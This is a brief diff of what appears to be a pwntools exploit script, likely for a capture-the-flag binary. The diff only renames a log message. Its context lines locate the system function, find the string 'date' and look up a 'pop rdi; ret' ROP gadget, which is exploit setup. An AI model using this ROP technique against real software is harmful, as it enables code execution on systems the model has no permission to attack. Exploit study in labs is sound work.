@@ -20,7 +20,7 @@ info("%#x system", elf.symbols.system)
 #info("%s libs", elf.libs)
 
 execute_string = next(elf.search("date"))
-info("%#x system", execute_string)
+info("%#x execute string", execute_string)
 
 rop = ROP(elf)
 POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
